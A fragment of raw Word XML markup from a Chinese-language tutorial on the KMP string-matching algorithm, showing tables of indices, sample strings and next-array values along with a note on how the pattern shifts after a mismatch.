          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>不再相等，这时就用到了回溯！！ ！先看下一次比较时，应该移动</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="2"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:jc w:val="center"/>
        <w:tblLayout w:type="fixed"/>
        <w:tblCellMar>
          <w:top w:w="0" w:type="dxa"/>
          <w:left w:w="10" w:type="dxa"/>
          <w:bottom w:w="0" w:type="dxa"/>
          <w:right w:w="10" w:type="dxa"/>
        </w:tblCellMar>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="450"/>
        <w:gridCol w:w="600"/>
        <w:gridCol w:w="1305"/>
        <w:gridCol w:w="1125"/>
        <w:gridCol w:w="375"/>
        <w:gridCol w:w="735"/>
        <w:gridCol w:w="1380"/>
      </w:tblGrid>
      <w:tr>
        <w:tblPrEx>
          <w:tblCellMar>
            <w:top w:w="0" w:type="dxa"/>
            <w:left w:w="10" w:type="dxa"/>
            <w:bottom w:w="0" w:type="dxa"/>
            <w:right w:w="10" w:type="dxa"/>
          </w:tblCellMar>
        </w:tblPrEx>
        <w:trPr>
          <w:trHeight w:val="510" w:hRule="exact"/>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:gridSpan w:val="7"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
            <w:vAlign w:val="top"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:pStyle w:val="17"/>
              <w:keepNext w:val="0"/>
              <w:keepLines w:val="0"/>
              <w:widowControl w:val="0"/>
              <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
              <w:bidi w:val="0"/>
              <w:spacing w:before="100" w:after="0" w:line="240" w:lineRule="auto"/>
              <w:ind w:left="0" w:right="0" w:firstLine="0"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="000000"/>
                <w:spacing w:val="0"/>
                <w:w w:val="100"/>
                <w:position w:val="0"/>
                <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
              </w:rPr>
              <w:t>里。</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tblPrEx>
          <w:tblCellMar>
            <w:top w:w="0" w:type="dxa"/>
            <w:left w:w="10" w:type="dxa"/>
            <w:bottom w:w="0" w:type="dxa"/>
            <w:right w:w="10" w:type="dxa"/>
          </w:tblCellMar>
        </w:tblPrEx>
        <w:trPr>
          <w:trHeight w:val="240" w:hRule="exact"/>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcBorders>
              <w:top w:val="single" w:color="auto" w:sz="4" w:space="0"/>
              <w:left w:val="single" w:color="auto" w:sz="4" w:space="0"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
            <w:vAlign w:val="top"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:widowControl w:val="0"/>
              <w:rPr>
                <w:sz w:val="10"/>
                <w:szCs w:val="10"/>
              </w:rPr>
            </w:pP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BCD</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E F </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="000000"/>
                <w:spacing w:val="0"/>
                <w:w w:val="100"/>
                <w:position w:val="0"/>
                <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
              </w:rPr>
              <w:t>二</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000000"/>
                <w:spacing w:val="0"/>
                <w:w w:val="100"/>
                <w:position w:val="0"/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
                <w:u w:val="single"/>
                <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
              </w:rPr>
              <w:t>H</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0"/>
                <w:szCs w:val="20"/>
                <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">i </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
                <w:smallCaps/>
                <w:color w:val="000000"/>
                <w:spacing w:val="0"/>
                <w:w w:val="100"/>
                <w:position w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
              </w:rPr>
              <w:t>Tj</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en-US" w:eastAsia="en-US" w:bidi="en-US"/>
              </w:rPr>
              <w:t>K L</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tblPrEx>
          <w:tblCellMar>
            <w:top w:w="0" w:type="dxa"/>
            <w:left w:w="10" w:type="dxa"/>
            <w:bottom w:w="0" w:type="dxa"/>
            <w:right w:w="10" w:type="dxa"/>
          </w:tblCellMar>
        </w:tblPrEx>
        <w:trPr>
          <w:trHeight w:val="255" w:hRule="exact"/>
          <w:jc w:val="center"/>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1</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index</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
            <w:vAlign w:val="top"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:pStyle w:val="17"/>
              <w:keepNext w:val="0"/>
              <w:keepLines w:val="0"/>
              <w:widowControl w:val="0"/>
              <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
              <w:tabs>
                <w:tab w:val="left" w:pos="1105"/>
              </w:tabs>
              <w:bidi w:val="0"/>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
              <w:ind w:left="0" w:right="0" w:firstLine="280"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="000000"/>
                <w:spacing w:val="0"/>
                <w:w w:val="100"/>
                <w:position w:val="0"/>
                <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
              </w:rPr>
              <w:t>Ol</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="000000"/>
                <w:spacing w:val="0"/>
                <w:w w:val="100"/>
                <w:position w:val="0"/>
                <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="000000"/>
                <w:spacing w:val="0"/>
                <w:w w:val="100"/>
                <w:position w:val="0"/>
                <w:u w:val="single"/>
                <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
              </w:rPr>
              <w:t>2</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
            <w:vAlign w:val="top"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:pStyle w:val="17"/>
              <w:keepNext w:val="0"/>
              <w:keepLines w:val="0"/>
              <w:widowControl w:val="0"/>
              <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
              <w:tabs>
                <w:tab w:val="left" w:pos="630"/>
              </w:tabs>
              <w:bidi w:val="0"/>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
              <w:ind w:left="0" w:right="0" w:firstLine="240"/>
              <w:jc w:val="left"/>
            </w:pP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4 5</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6</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lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
              </w:rPr>
              <w:t>7</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95" w:hRule="exact"/>
          <w:jc w:val="center"/>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2</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Str：</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aba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 a b</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c</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jc w:val="center"/>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3</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next</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="000000"/>
                <w:spacing w:val="0"/>
                <w:w w:val="100"/>
                <w:position w:val="0"/>
                <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
              </w:rPr>
              <w:t>:</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-i -i 0</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:pStyle w:val="17"/>
              <w:keepNext w:val="0"/>
              <w:keepLines w:val="0"/>
              <w:widowControl w:val="0"/>
              <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
              <w:tabs>
                <w:tab w:val="left" w:pos="615"/>
              </w:tabs>
              <w:bidi w:val="0"/>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
              <w:ind w:left="0" w:right="0" w:firstLine="240"/>
              <w:jc w:val="left"/>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2 3</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4</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jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcBorders>
              <w:top w:val="single" w:color="auto" w:sz="4" w:space="0"/>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4 1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
            <w:vAlign w:val="top"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:widowControl w:val="0"/>
              <w:rPr>
                <w:sz w:val="10"/>
                <w:szCs w:val="10"/>
              </w:rPr>
            </w:pP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str： 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b </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="000000"/>
                <w:spacing w:val="0"/>
                <w:w w:val="100"/>
                <w:position w:val="0"/>
                <w:u w:val="single"/>
                <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
              </w:rPr>
              <w:t>a b</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i/>
                <w:iCs/>
                <w:color w:val="000000"/>
                <w:spacing w:val="0"/>
                <w:w w:val="100"/>
                <w:position w:val="0"/>
                <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
              </w:rPr>
              <w:t>Q</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 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c</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tblPrEx>
          <w:tblCellMar>
            <w:top w:w="0" w:type="dxa"/>
            <w:left w:w="10" w:type="dxa"/>
            <w:bottom w:w="0" w:type="dxa"/>
            <w:right w:w="10" w:type="dxa"/>
          </w:tblCellMar>
        </w:tblPrEx>
        <w:trPr>
          <w:trHeight w:val="255" w:hRule="exact"/>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcBorders>
              <w:top w:val="single" w:color="auto" w:sz="4" w:space="0"/>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5</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top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str</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="000000"/>
                <w:spacing w:val="0"/>
                <w:w w:val="100"/>
                <w:position w:val="0"/>
                <w:u w:val="single"/>
                <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
              </w:rPr>
              <w:t>ia b</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcBorders>
              <w:top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i</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lb </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="000000"/>
                <w:spacing w:val="0"/>
                <w:w w:val="100"/>
                <w:position w:val="0"/>
                <w:vertAlign w:val="subscript"/>
                <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
              </w:rPr>
              <w:t>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b a c</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tblPrEx>
          <w:tblCellMar>
            <w:top w:w="0" w:type="dxa"/>
            <w:left w:w="10" w:type="dxa"/>
            <w:bottom w:w="0" w:type="dxa"/>
            <w:right w:w="10" w:type="dxa"/>
          </w:tblCellMar>
        </w:tblPrEx>
        <w:trPr>
          <w:trHeight w:val="210" w:hRule="exact"/>
          <w:jc w:val="center"/>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u</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p>
      <w:pPr>
        <w:pStyle w:val="19"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="30" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>原因要再回来看上一次比较，上一次比较相同长度为5。</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="2"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblInd w:w="0" w:type="dxa"/>
        <w:tblLayout w:type="fixed"/>
        <w:tblCellMar>
          <w:top w:w="0" w:type="dxa"/>
          <w:left w:w="10" w:type="dxa"/>
          <w:bottom w:w="0" w:type="dxa"/>
          <w:right w:w="10" w:type="dxa"/>
        </w:tblCellMar>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="480"/>
        <w:gridCol w:w="600"/>
        <w:gridCol w:w="1305"/>
        <w:gridCol w:w="795"/>
        <w:gridCol w:w="330"/>
        <w:gridCol w:w="1110"/>
        <w:gridCol w:w="1275"/>
      </w:tblGrid>
      <w:tr>
        <w:tblPrEx>
          <w:tblCellMar>
            <w:top w:w="0" w:type="dxa"/>
            <w:left w:w="10" w:type="dxa"/>
            <w:bottom w:w="0" w:type="dxa"/>
            <w:right w:w="10" w:type="dxa"/>
          </w:tblCellMar>
        </w:tblPrEx>
        <w:trPr>
          <w:trHeight w:val="270" w:hRule="exact"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
            <w:vAlign w:val="top"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:widowControl w:val="0"/>
              <w:rPr>
                <w:sz w:val="10"/>
                <w:szCs w:val="10"/>
              </w:rPr>
            </w:pP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en-US" w:eastAsia="en-US" w:bidi="en-US"/>
              </w:rPr>
              <w:t>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0"/>
                <w:szCs w:val="20"/>
                <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">B </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:i/>
                <w:iCs/>
                <w:color w:val="000000"/>
                <w:spacing w:val="0"/>
                <w:w w:val="100"/>
                <w:position w:val="0"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
                <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">C </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
                <w:smallCaps/>
                <w:color w:val="000000"/>
                <w:spacing w:val="0"/>
                <w:w w:val="100"/>
                <w:position w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
              </w:rPr>
              <w:t>Ld_</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E _F_</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H I l_L</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en-US" w:eastAsia="en-US" w:bidi="en-US"/>
              </w:rPr>
              <w:t>K L</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tblPrEx>
          <w:tblCellMar>
            <w:top w:w="0" w:type="dxa"/>
            <w:left w:w="10" w:type="dxa"/>
            <w:bottom w:w="0" w:type="dxa"/>
            <w:right w:w="10" w:type="dxa"/>
          </w:tblCellMar>
        </w:tblPrEx>
        <w:trPr>
          <w:trHeight w:val="240" w:hRule="exact"/>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1</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index</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
            <w:vAlign w:val="top"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:pStyle w:val="17"/>
              <w:keepNext w:val="0"/>
              <w:keepLines w:val="0"/>
              <w:widowControl w:val="0"/>
              <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
              <w:tabs>
                <w:tab w:val="left" w:pos="420"/>
                <w:tab w:val="left" w:pos="825"/>
              </w:tabs>
              <w:bidi w:val="0"/>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
              <w:ind w:left="0" w:right="0" w:firstLine="0"/>
              <w:jc w:val="right"/>
            </w:pP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p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
            <w:vAlign w:val="top"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:pStyle w:val="17"/>
              <w:keepNext w:val="0"/>
              <w:keepLines w:val="0"/>
              <w:widowControl w:val="0"/>
              <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
              <w:tabs>
                <w:tab w:val="left" w:pos="630"/>
              </w:tabs>
              <w:bidi w:val="0"/>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
              <w:ind w:left="0" w:right="0" w:firstLine="240"/>
              <w:jc w:val="left"/>
            </w:pP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5</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
            <w:vAlign w:val="top"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:pStyle w:val="17"/>
              <w:keepNext w:val="0"/>
              <w:keepLines w:val="0"/>
              <w:widowControl w:val="0"/>
              <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
              <w:tabs>
                <w:tab w:val="left" w:pos="630"/>
              </w:tabs>
              <w:bidi w:val="0"/>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
              <w:ind w:left="0" w:right="0" w:firstLine="240"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="000000"/>
                <w:spacing w:val="0"/>
                <w:w w:val="100"/>
                <w:position w:val="0"/>
                <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
              </w:rPr>
              <w:t>5</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="000000"/>
                <w:spacing w:val="0"/>
                <w:w w:val="100"/>
                <w:position w:val="0"/>
                <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:i/>
                <w:iCs/>
                <w:color w:val="000000"/>
                <w:spacing w:val="0"/>
                <w:w w:val="100"/>
                <w:position w:val="0"/>
                <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
              </w:rPr>
              <w:t>7</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10" w:hRule="exact"/>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2</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str:</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aba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 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c</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5" w:hRule="exact"/>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J</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next</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="000000"/>
                <w:spacing w:val="0"/>
                <w:w w:val="100"/>
                <w:position w:val="0"/>
                <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
              </w:rPr>
              <w:t>:</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:pStyle w:val="17"/>
              <w:keepNext w:val="0"/>
              <w:keepLines w:val="0"/>
              <w:widowControl w:val="0"/>
              <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
              <w:tabs>
                <w:tab w:val="left" w:pos="1110"/>
              </w:tabs>
              <w:bidi w:val="0"/>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
              <w:ind w:left="0" w:right="0" w:firstLine="180"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="000000"/>
                <w:spacing w:val="0"/>
                <w:w w:val="100"/>
                <w:position w:val="0"/>
                <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
              </w:rPr>
              <w:t>-1 -1</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="000000"/>
                <w:spacing w:val="0"/>
                <w:w w:val="100"/>
                <w:position w:val="0"/>
                <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="000000"/>
                <w:spacing w:val="0"/>
                <w:w w:val="100"/>
                <w:position w:val="0"/>
                <w:u w:val="single"/>
                <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
              </w:rPr>
              <w:t>0</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:pStyle w:val="17"/>
              <w:keepNext w:val="0"/>
              <w:keepLines w:val="0"/>
              <w:widowControl w:val="0"/>
              <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
              <w:tabs>
                <w:tab w:val="left" w:pos="615"/>
              </w:tabs>
              <w:bidi w:val="0"/>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
              <w:ind w:left="0" w:right="0" w:firstLine="240"/>
              <w:jc w:val="left"/>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3</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en-US" w:eastAsia="en-US" w:bidi="en-US"/>
              </w:rPr>
              <w:t>4</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85" w:hRule="exact"/>
        </w:trPr>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lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
              </w:rPr>
              <w:t>4</w:t>
            </w:r>
          </w:p>
        </w:tc>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xml:space="preserve">str </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="000000"/>
                <w:spacing w:val="0"/>
                <w:w w:val="100"/>
                <w:position w:val="0"/>
                <w:u w:val="single"/>
                <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
              </w:rPr>
              <w:t>J,</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 a</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lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
              </w:rPr>
              <w:t>a</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="000000"/>
                <w:spacing w:val="0"/>
                <w:w w:val="100"/>
                <w:position w:val="0"/>
                <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> lb 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40"/>
              <w:jc w:val="both"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="000000"/>
                <w:spacing w:val="0"/>
                <w:w w:val="100"/>
                <w:position w:val="0"/>
                <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
              </w:rPr>
              <w:t>c</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tblPrEx>
          <w:tblCellMar>
            <w:top w:w="0" w:type="dxa"/>
            <w:left w:w="10" w:type="dxa"/>
            <w:bottom w:w="0" w:type="dxa"/>
            <w:right w:w="10" w:type="dxa"/>
          </w:tblCellMar>
        </w:tblPrEx>
        <w:trPr>
          <w:trHeight w:val="315" w:hRule="exact"/>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u w:val="single"/>
                <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
              </w:rPr>
              <w:t>5</w:t>
            </w:r>
          </w:p>
        </w:tc>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str</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="000000"/>
                <w:spacing w:val="0"/>
                <w:w w:val="100"/>
                <w:position w:val="0"/>
                <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
              </w:rPr>
              <w:t>:</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="000000"/>
                <w:spacing w:val="0"/>
                <w:w w:val="100"/>
                <w:position w:val="0"/>
                <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
              </w:rPr>
              <w:t>a</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w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcBorders>
              <w:top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aba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b a c</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p>
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:after="179" w:line="1" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:line="1" w:lineRule="exact"/>
      </w:pPr>
      <w:r>
        <w:drawing>
          <wp:anchor distT="0" distB="12700" distL="0" distR="0" simplePos="0" relativeHeight="125830144" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1">
            <wp:simplePos x="0" y="0"/>
            <wp:positionH relativeFrom="page">
              <wp:posOffset>1490980</wp:posOffset>
            </wp:positionH>
            <wp:positionV relativeFrom="paragraph">
              <wp:posOffset>0</wp:posOffset>
            </wp:positionV>
            <wp:extent cx="4648200" cy="4067175"/>
            <wp:effectExtent l="0" t="0" r="0" b="9525"/>
            <wp:wrapTopAndBottom/>
            <wp:docPr id="19" name="Shape 19"/>
            <wp:cNvGraphicFramePr/>
            <a:graphic xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
              <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/picture">
                <pic:pic xmlns:pic="http://schemas.openxmlformats.org/drawingml/2006/picture">
                  <pic:nvPicPr>
                    <pic:cNvPr id="19" name="Shape 19"/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId31"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="4648200" cy="4067175"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:anchor>
        </w:drawing>
      </w:r>
      <w:r>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:anchor distT="228600" distB="2955925" distL="0" distR="0" simplePos="0" relativeHeight="125830144" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="page">
                  <wp:posOffset>1405255</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>228600</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="3295650" cy="895350"/>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3295650" cy="895350"/>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465"/>
                              <w:gridCol w:w="585"/>
                              <w:gridCol w:w="465"/>
                              <w:gridCol w:w="1230"/>
                              <w:gridCol w:w="2445"/>
                            </w:tblGrid>
                            <w:tr>
                              <w:tblPrEx>
                                <w:tblCellMar>
                                  <w:top w:w="0" w:type="dxa"/>
                                  <w:left w:w="10" w:type="dxa"/>
                                  <w:bottom w:w="0" w:type="dxa"/>
                                  <w:right w:w="10" w:type="dxa"/>
                                </w:tblCellMar>
                              </w:tblPrEx>
                              <w:trPr>
                                <w:trHeight w:val="210" w:hRule="exact"/>
                                <w:tblHeader/>
                              </w:trPr>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20"/>
                                    <w:jc w:val="left"/>
                                  </w:pPr>
                                  <w:r>
                                    <w:rPr>
                                      <w:color w:val="000000"/>
                                      <w:spacing w:val="0"/>
                                      <w:w w:val="100"/>
                                      <w:position w:val="0"/>
                                      <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
                                    </w:rPr>
                                    <w:t>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B</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C D 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 G H I J K</w:t>
                                  </w:r>
                                </w:p>
                              </w:tc>
                            </w:tr>
                            <w:tr>
                              <w:tblPrEx>
                                <w:tblCellMar>
                                  <w:top w:w="0" w:type="dxa"/>
                                  <w:left w:w="10" w:type="dxa"/>
                                  <w:bottom w:w="0" w:type="dxa"/>
                                  <w:right w:w="10" w:type="dxa"/>
                                </w:tblCellMar>
                              </w:tblPrEx>
                              <w:trPr>
                                <w:trHeight w:val="255" w:hRule="exact"/>
                              </w:trPr>
                              <w:tc>
                                <w:tcPr>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1</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index</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0</w:t>
                                  </w:r>
                                </w:p>
                              </w:tc>
                              <w:tc>
                                <w:tcPr>
                                  <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                                  <w:vAlign w:val="center"/>
                                </w:tcPr>
                                <w:p>
                                  <w:pPr>
                                    <w:pStyle w:val="17"/>
                                    <w:keepNext w:val="0"/>
                                    <w:keepLines w:val="0"/>
                                    <w:widowControl w:val="0"/>
                                    <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
                                    <w:tabs>
                                      <w:tab w:val="left" w:pos="670"/>
                                      <w:tab w:val="left" w:pos="1060"/>
                                    </w:tabs>
                                    <w:bidi w:val="0"/>
                                    <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
                                    <w:ind w:left="0" w:right="0" w:firstLine="280"/>
                                    <w:jc w:val="left"/>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p>
                              </w:tc>
                              <w:tc>
                                <w:tcPr>
                                  <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                                  <w:vAlign w:val="center"/>
                                </w:tcPr>
                                <w:p>
                                  <w:pPr>
                                    <w:pStyle w:val="17"/>
                                    <w:keepNext w:val="0"/>
                                    <w:keepLines w:val="0"/>
                                    <w:widowControl w:val="0"/>
                                    <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
                                    <w:tabs>
                                      <w:tab w:val="left" w:pos="935"/>
                                      <w:tab w:val="left" w:pos="1355"/>
                                    </w:tabs>
                                    <w:bidi w:val="0"/>
